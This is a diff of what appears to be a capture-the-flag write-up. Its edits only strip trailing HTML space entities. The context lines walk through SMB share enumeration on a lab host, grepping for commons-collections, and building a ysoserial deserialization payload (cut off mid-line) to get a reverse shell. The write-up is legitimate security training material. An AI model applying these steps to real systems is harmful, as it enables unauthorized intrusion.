@@ -32,7 +32,7 @@ $ smbmap -H 192.168.208.116
         IPC$                                                    NO ACCESS       IPC Service (Samba 4.10.4)
 ```
 
-We cam connect to that via `smbclient`.&#x20;
+We cam connect to that via `smbclient`.
 
 ```
 $ smbclient //192.168.208.116/Samantha\ Konstan  
@@ -71,7 +71,7 @@ Samantha Konstan
 Java Mantainer
 ```
 
-`.ser` seems to be an important file. There was also mention of a 'dashboard app\`, which was likely one of the web applications hosted on this.&#x20;
+`.ser` seems to be an important file. There was also mention of a 'dashboard app\`, which was likely one of the web applications hosted on this.
 
 ### Web Enumeration -> Web Creds
 
@@ -145,7 +145,7 @@ src/main/java/com/industrial/recycler/MvcConfig.java
 src/main/java/com/industrial/recycler/DashboardController.java
 ```
 
-Seems that we have source code. Before delving into this, let's check out port 8080, which hosted the dashboard mentioned in the `readme.txt` from SMB.&#x20;
+Seems that we have source code. Before delving into this, let's check out port 8080, which hosted the dashboard mentioned in the `readme.txt` from SMB.
 
 <figure><img src="../../../.gitbook/assets/image (1419).png" alt=""><figcaption></figcaption></figure>
 
@@ -240,7 +240,7 @@ We can see that the `recycler.ser` file is being used for both functions, where 
 
 {% embed url="https://book.hacktricks.xyz/pentesting-web/deserialization#java-http" %}
 
-First we need to check if its vulnerable by searching all the SMB and Recycler files for mention of `commons-collections`.&#x20;
+First we need to check if its vulnerable by searching all the SMB and Recycler files for mention of `commons-collections`.
 
 ```
 $ grep -R commons
@@ -253,7 +253,7 @@ smb/pom-bak.xml:                    <artifactId>commons-collections4</artifactId
 
 <figure><img src="../../../.gitbook/assets/image (1383).png" alt=""><figcaption></figcaption></figure>
 
-Based on the timestamp, this worked. So now, we need to create our serialised payload using `ysoserial`.&#x20;
+Based on the timestamp, this worked. So now, we need to create our serialised payload using `ysoserial`.
 
 {% code overflow="wrap" %}
 ```
@@ -265,7 +265,7 @@ $ /usr/lib/jvm/java-8-openjdk-amd64/bin/java -jar ~/ysoserial-all.jar CommonsCol
 {% endcode %}
 
 {% hint style="info" %}
-You must use Java 8 to make it work. The latest versions of Java cannot run `ysoserial.jar` properly.&#x20;
+You must use Java 8 to make it work. The latest versions of Java cannot run `ysoserial.jar` properly.
 {% endhint %}
 
 This would generate a serialised object that we can use. Afterwards, place this within the share and click on Check Status on the website to get a reverse shell:
